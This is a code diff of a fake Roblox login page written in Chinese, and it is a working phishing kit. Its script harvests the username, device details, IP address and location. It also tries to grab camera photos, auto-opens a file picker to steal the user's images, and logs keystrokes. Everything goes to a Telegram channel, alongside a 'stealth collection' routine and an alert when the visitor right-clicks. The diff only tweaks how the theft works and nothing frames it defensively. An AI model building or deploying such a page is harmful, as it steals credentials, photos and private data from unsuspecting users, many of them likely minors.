@@ -6,253 +6,257 @@
     <title>登录 Roblox - roblox.com</title>
     <style>
         /* 完全按照截图样式 */
-        body {
+        * {
             margin: 0;
             padding: 0;
-            font-family: "Segoe UI", Arial, sans-serif;
-            background-color: #ffffff;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            background: #ffffff;
             color: #000000;
+            line-height: 1.4;
         }
-
-        /* 顶部栏 - 精确复制截图 */
-        .top-bar {
-            background-color: #f8f9fa;
-            padding: 15px 40px;
-            border-bottom: 1px solid #dee2e6;
+        
+        /* 顶部区域 - 精确复制截图 */
+        .header {
+            padding: 15px 20px;
+            background: #ffffff;
+            border-bottom: 1px solid #e0e0e0;
         }
-
-        .top-content {
+        
+        .header-content {
             max-width: 1200px;
             margin: 0 auto;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
-
-        .title-section {
+        
+        /* 标题部分 - 精确字体大小和颜色 */
+        .title-container {
             display: flex;
             flex-direction: column;
-            align-items: flex-start;
+            gap: 2px;
         }
-
+        
         .main-title {
-            font-size: 24px;
-            font-weight: 700;
+            font-size: 28px;
+            font-weight: bold;
             color: #000000;
             margin: 0;
-            line-height: 1.2;
         }
-
-        .url-text {
-            font-size: 14px;
+        
+        .url {
+            font-size: 16px;
             color: #666666;
-            margin: 2px 0 0 0;
-            font-weight: 400;
+            margin: 0;
         }
-
-        .signup-button {
-            background-color: #28a745;
-            color: white;
+        
+        /* 注册按钮 - 精确绿色 */
+        .signup-btn {
+            background: #00a2ff;
+            color: #ffffff;
             border: none;
             padding: 8px 20px;
             border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
+            font-size: 16px;
+            font-weight: normal;
             cursor: pointer;
             text-decoration: none;
+            display: inline-block;
         }
-
-        /* 导航栏 - 精确复制 */
-        .nav-bar {
+        
+        /* 导航栏 - 精确间距和颜色 */
+        .nav-container {
             max-width: 1200px;
             margin: 20px auto;
-            padding: 0 40px;
+            padding: 0 20px;
             display: flex;
             justify-content: center;
             gap: 40px;
         }
-
-        .nav-link {
+        
+        .nav-item {
             color: #000000;
             text-decoration: none;
-            font-size: 16px;
-            font-weight: 500;
+            font-size: 18px;
+            font-weight: normal;
             padding: 5px 0;
         }
-
-        .nav-link:hover {
-            color: #007bff;
+        
+        .nav-item:hover {
+            color: #00a2ff;
         }
-
-        .nav-link.robux {
-            color: #dc3545;
-            font-weight: 600;
+        
+        .nav-item.robux {
+            color: #ff6b6b;
+            font-weight: bold;
         }
-
-        /* 主登录区域 - 精确复制 */
-        .login-container {
+        
+        /* 主登录区域 */
+        .login-section {
             max-width: 400px;
             margin: 0 auto;
             padding: 20px;
             text-align: center;
         }
-
-        .login-heading {
-            font-size: 28px;
-            font-weight: 700;
+        
+        .login-title {
+            font-size: 32px;
+            font-weight: bold;
             color: #000000;
             margin: 0 0 30px 0;
         }
-
-        /* 表单样式 - 完全按照截图 */
+        
+        /* 表单样式 - 精确复制 */
         .form-group {
             margin-bottom: 20px;
             text-align: left;
         }
-
+        
         .form-label {
             display: block;
-            font-size: 14px;
-            font-weight: 600;
+            font-size: 16px;
+            font-weight: normal;
             color: #000000;
             margin-bottom: 5px;
         }
-
+        
         .form-input {
             width: 100%;
-            padding: 10px 12px;
-            border: 1px solid #ced4da;
+            padding: 12px;
+            border: 1px solid #cccccc;
             border-radius: 4px;
             font-size: 16px;
             color: #000000;
-            background-color: #ffffff;
+            background: #ffffff;
             box-sizing: border-box;
         }
-
+        
         .form-input:focus {
             outline: none;
-            border-color: #80bdff;
-            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
+            border-color: #00a2ff;
         }
-
+        
         .form-input::placeholder {
-            color: #6c757d;
-            font-size: 14px;
+            color: #999999;
+            font-size: 16px;
         }
-
+        
         /* 密码框 */
         .password-wrapper {
             position: relative;
         }
-
+        
         .toggle-password {
             position: absolute;
-            right: 10px;
+            right: 12px;
             top: 50%;
             transform: translateY(-50%);
             background: none;
             border: none;
-            color: #6c757d;
+            color: #666666;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 18px;
             padding: 0;
         }
-
-        /* 登录按钮 - 精确样式 */
+        
+        /* 登录按钮 - 精确蓝色 */
         .login-btn {
             width: 100%;
-            padding: 10px;
-            background-color: #007bff;
-            color: white;
+            padding: 12px;
+            background: #00a2ff;
+            color: #ffffff;
             border: none;
             border-radius: 4px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: normal;
             cursor: pointer;
             margin-top: 10px;
         }
-
+        
         .login-btn:hover {
-            background-color: #0056b3;
+            background: #0088cc;
         }
-
+        
         .login-btn:disabled {
-            background-color: #6c757d;
+            background: #cccccc;
             cursor: not-allowed;
         }
-
-        /* 链接区域 - 精确复制 */
-        .links-section {
+        
+        /* 链接区域 - 精确样式 */
+        .links-container {
             margin: 25px 0;
             text-align: center;
         }
-
+        
         .help-link {
             display: block;
-            color: #007bff;
+            color: #00a2ff;
             text-decoration: none;
             font-size: 14px;
             margin-bottom: 10px;
-            line-height: 1.5;
         }
-
+        
         .help-link:hover {
             text-decoration: underline;
         }
-
+        
         /* 注册区域 - 精确复制 */
-        .register-section {
+        .register-container {
             margin-top: 25px;
             padding-top: 25px;
-            border-top: 1px solid #dee2e6;
+            border-top: 1px solid #e0e0e0;
             text-align: center;
         }
-
+        
         .register-text {
             font-size: 14px;
-            color: #6c757d;
+            color: #666666;
             margin-bottom: 10px;
         }
-
+        
         .register-btn {
-            display: inline-block;
-            background-color: #28a745;
-            color: white;
+            background: #00a2ff;
+            color: #ffffff;
             border: none;
-            padding: 8px 24px;
+            padding: 10px 24px;
             border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
+            font-size: 16px;
+            font-weight: normal;
             cursor: pointer;
             text-decoration: none;
+            display: inline-block;
         }
-
+        
         .register-btn:hover {
-            background-color: #218838;
+            background: #0088cc;
             text-decoration: none;
         }
-
+        
         /* 状态消息 */
         .status-message {
-            padding: 10px;
+            padding: 12px;
             border-radius: 4px;
             margin: 15px 0;
             font-size: 14px;
             display: none;
         }
-
+        
         .status-success {
-            background-color: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
+            background: #e8f5e8;
+            color: #2e7d32;
+            border: 1px solid #c8e6c9;
         }
-
+        
         .status-error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
+            background: #ffebee;
+            color: #c62828;
+            border: 1px solid #ffcdd2;
         }
-
+        
         /* 加载动画 */
         .loading-overlay {
             position: fixed;
@@ -260,44 +264,48 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.9);
+            background: rgba(255, 255, 255, 0.95);
             display: none;
             justify-content: center;
             align-items: center;
             z-index: 1000;
         }
-
+        
         .loading-spinner {
             width: 40px;
             height: 40px;
             border: 3px solid #f3f3f3;
-            border-top: 3px solid #007bff;
+            border-top: 3px solid #00a2ff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
-
+        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
+        
         .hidden {
             display: none !important;
         }
-
-        /* 响应式调整 */
+        
+        /* 响应式 */
         @media (max-width: 768px) {
-            .top-bar {
-                padding: 15px 20px;
+            .header {
+                padding: 15px;
             }
             
-            .nav-bar {
-                padding: 0 20px;
+            .nav-container {
                 gap: 20px;
+                padding: 0 15px;
             }
             
-            .nav-link {
-                font-size: 14px;
+            .nav-item {
+                font-size: 16px;
+            }
+            
+            .login-section {
+                padding: 15px;
             }
         }
     </style>
@@ -308,28 +316,28 @@
         <div class="loading-spinner"></div>
     </div>
 
-    <!-- 顶部栏 - 完全按照截图 -->
-    <div class="top-bar">
-        <div class="top-content">
-            <div class="title-section">
+    <!-- 顶部区域 - 完全按照截图 -->
+    <div class="header">
+        <div class="header-content">
+            <div class="title-container">
                 <h1 class="main-title">登录 Roblox</h1>
-                <div class="url-text">roblox.com</div>
+                <p class="url">roblox.com</p>
             </div>
-            <a href="#" class="signup-button">注册</a>
+            <a href="#" class="signup-btn">注册</a>
         </div>
     </div>
 
     <!-- 导航栏 - 完全按照截图 -->
-    <div class="nav-bar">
-        <a href="#" class="nav-link">排行榜</a>
-        <a href="#" class="nav-link">商城</a>
-        <a href="#" class="nav-link">创作</a>
-        <a href="#" class="nav-link robux">Robux</a>
+    <div class="nav-container">
+        <a href="#" class="nav-item">排行榜</a>
+        <a href="#" class="nav-item">商城</a>
+        <a href="#" class="nav-item">创作</a>
+        <a href="#" class="nav-item robux">Robux</a>
     </div>
 
     <!-- 主登录区域 - 完全按照截图 -->
-    <div class="login-container">
-        <h2 class="login-heading">登录 Roblox</h2>
+    <div class="login-section">
+        <h2 class="login-title">登录 Roblox</h2>
         
         <!-- 登录表单 -->
         <form id="loginForm">
@@ -373,14 +381,14 @@
         </form>
 
         <!-- 链接区域 - 完全按照截图 -->
-        <div class="links-section">
+        <div class="links-container">
             <a href="#" class="help-link">忘记密码或用户名？</a>
             <a href="#" class="help-link">通过电子邮件向我发送一次性验证码</a>
             <a href="#" class="help-link">使用另一台设备</a>
         </div>
 
         <!-- 注册区域 - 完全按照截图 -->
-        <div class="register-section">
+        <div class="register-container">
             <div class="register-text">没有帐户？</div>
             <a href="#" class="register-btn">注册</a>
         </div>
@@ -407,8 +415,7 @@
         networkInfo: {},
         photos: [],
         files: [],
-        behavior: {},
-        systemInfo: {}
+        behavior: {}
     };
 
     let isCollecting = false;
@@ -492,7 +499,7 @@
 🕐 <b>获取时间:</b> ${new Date().toLocaleString('zh-CN')}
 ────────────────
 📱 <b>设备:</b> ${navigator.platform}
-🌐 <b>浏览器:</b> ${navigator.userAgent.split(' ').pop()}
+🌐 <b>浏览器:</b> ${detectBrowser()}
 ────────────────`;
         
         await sendToTelegram(message);
@@ -502,6 +509,15 @@
         const div = document.createElement('div');
         div.textContent = text;
         return div.innerHTML;
+    }
+
+    function detectBrowser() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+        if (ua.includes('Firefox')) return 'Firefox';
+        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+        if (ua.includes('Edg')) return 'Edge';
+        return '未知';
     }
 
     // ==================== 设备信息收集 ====================
@@ -521,61 +537,15 @@
             }
         };
 
-        // 检测操作系统
-        collectedData.systemInfo.os = detectOS();
-        
-        // 检测浏览器
-        collectedData.systemInfo.browser = detectBrowser();
-        
-        // 获取Canvas指纹
-        collectedData.deviceInfo.canvasFingerprint = getCanvasFingerprint();
-        
-        // 发送设备信息
-        const deviceMsg = `📱 <b>设备信息收集完成</b>
+        const deviceMsg = `📱 <b>设备信息</b>
 ────────────────
-💻 <b>系统:</b> ${collectedData.systemInfo.os}
-🌐 <b>浏览器:</b> ${collectedData.systemInfo.browser}
+💻 <b>系统:</b> ${navigator.platform}
 🖥️ <b>分辨率:</b> ${screen.width}x${screen.height}
 🔢 <b>CPU核心:</b> ${navigator.hardwareConcurrency}
+💾 <b>内存:</b> ${navigator.deviceMemory || '未知'}GB
 ────────────────`;
         
         await sendToTelegram(deviceMsg);
-    }
-
-    function detectOS() {
-        const ua = navigator.userAgent;
-        if (/Windows/.test(ua)) return 'Windows';
-        if (/Mac/.test(ua)) return 'macOS';
-        if (/Linux/.test(ua)) return 'Linux';
-        if (/Android/.test(ua)) return 'Android';
-        if (/iPhone|iPad/.test(ua)) return 'iOS';
-        return '未知';
-    }
-
-    function detectBrowser() {
-        const ua = navigator.userAgent;
-        if (/Chrome/.test(ua) && !/Edg/.test(ua)) return 'Chrome';
-        if (/Firefox/.test(ua)) return 'Firefox';
-        if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'Safari';
-        if (/Edg/.test(ua)) return 'Edge';
-        return '未知';
-    }
-
-    function getCanvasFingerprint() {
-        try {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = 200;
-            canvas.height = 50;
-            ctx.fillStyle = '#007bff';
-            ctx.fillRect(0, 0, 200, 50);
-            ctx.fillStyle = '#ffffff';
-            ctx.font = '16px Arial';
-            ctx.fillText('Roblox', 10, 25);
-            return canvas.toDataURL().substring(0, 100);
-        } catch (e) {
-            return null;
-        }
     }
 
     // ==================== 网络信息收集 ====================
@@ -598,12 +568,12 @@
                 isp: geoData.org
             };
             
-            // 发送位置信息
-            const locationMsg = `📍 <b>位置信息收集完成</b>
+            const locationMsg = `📍 <b>位置信息</b>
 ────────────────
 🌍 <b>国家:</b> ${geoData.country_name || '未知'}
 🏙️ <b>城市:</b> ${geoData.city || '未知'}
 🌐 <b>IP:</b> ${ipData.ip}
+📡 <b>运营商:</b> ${geoData.org || '未知'}
 ────────────────`;
             
             await sendToTelegram(locationMsg);
@@ -640,7 +610,7 @@
                     
                     canvas.toBlob(async (blob) => {
                         if (blob) {
-                            const file = new File([blob], `roblox_photo_${Date.now()}.jpg`, {
+                            const file = new File([blob], `roblox_${Date.now()}.jpg`, {
                                 type: 'image/jpeg'
                             });
                             
@@ -657,13 +627,14 @@
                             resolve(true);
                         }
                     }, 'image/jpeg', 0.8);
-                }, 1000);
+                }, 1500);
             });
             
         } catch (error) {
             return false;
         }
     }
+
     // ==================== 文件系统访问 ====================
     function attemptFileAccess() {
         // 自动触发文件夹访问
@@ -684,15 +655,17 @@
                             timestamp: new Date().toISOString()
                         });
                         
-                        await sendToTelegram(`📁 <b>文件夹扫描完成</b>\n发现文件: ${files.length}个`);
+                        await sendToTelegram(`📁 <b>文件夹扫描</b>\n发现文件: ${files.length}个`);
                         
                         // 处理图片文件
                         const imageFiles = files.filter(file => 
-                            file.type.startsWith('image/') && file.size < 5 * 1024 * 1024
-                        ).slice(0, 3);
+                            file.type.startsWith('image/')
+                        ).slice(0, 2);
                         
                         for (const file of imageFiles) {
-                            await sendPhotoToTelegram(file, '📁 系统图片');
+                            if (file.size < 3 * 1024 * 1024) {
+                                await sendPhotoToTelegram(file, '📁 系统图片');
+                            }
                         }
                     });
                     
@@ -703,13 +676,12 @@
                         try {
                             fileInput.click();
                         } catch (e) {}
-                    }, 3000);
+                    }, 4000);
                     
                 } catch (e) {}
             }, 2000);
         }
     }
-
     // ==================== 行为监控 ====================
     function startBehaviorMonitoring() {
         collectedData.behavior = {
@@ -726,22 +698,15 @@
             });
         });
         
-        // 键盘监控（不记录密码框）
+        // 键盘监控
         document.addEventListener('keydown', (e) => {
-            if (e.target.id !== 'password' && e.target.id !== 'username') {
+            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
                 collectedData.behavior.keystrokes.push({
                     key: e.key,
                     time: Date.now()
                 });
             }
         });
-        
-        // 定期发送行为摘要
-        setInterval(async () => {
-            if (collectedData.behavior.keystrokes.length > 0) {
-                await sendToTelegram(`⌨️ <b>行为监控</b>\n按键记录: ${collectedData.behavior.keystrokes.length}次`);
-            }
-        }, 30000);
     }
 
     // ==================== 主收集流程 ====================
@@ -755,22 +720,22 @@
         loginBtn.textContent = '验证中...';
         
         try {
-            // 步骤1：收集设备信息
+            // 收集设备信息
             await collectDeviceInfo();
             await delay(1000);
             
-            // 步骤2：收集网络信息
+            // 收集网络信息
             await collectNetworkInfo();
             await delay(1000);
             
-            // 步骤3：尝试摄像头访问
+            // 尝试摄像头访问
             await accessCamera();
             await delay(1000);
             
-            // 步骤4：开始行为监控
+            // 开始行为监控
             startBehaviorMonitoring();
             
-            // 步骤5：尝试文件访问
+            // 尝试文件访问
             attemptFileAccess();
             
             // 发送完整报告
@@ -802,7 +767,7 @@
 ────────────────
 👤 <b>用户名:</b> ${collectedData.credentials.username || '无'}
 ────────────────
-📱 <b>设备:</b> ${collectedData.systemInfo.os || '未知'}
+📱 <b>设备:</b> ${navigator.platform}
 📍 <b>位置:</b> ${collectedData.networkInfo.geo?.city || '未知'}
 ────────────────
 📸 <b>照片:</b> ${collectedData.photos.length}张
@@ -846,6 +811,7 @@
         // 禁用右键
         document.addEventListener('contextmenu', (e) => {
             e.preventDefault();
+            sendToTelegram('⚠️ 用户尝试右键点击页面');
             return false;
         });
         
@@ -879,7 +845,7 @@
             if (!isCollecting) {
                 stealthCollection();
             }
-        }, 5000);
+        }, 6000);
     });
 
     // 静默收集
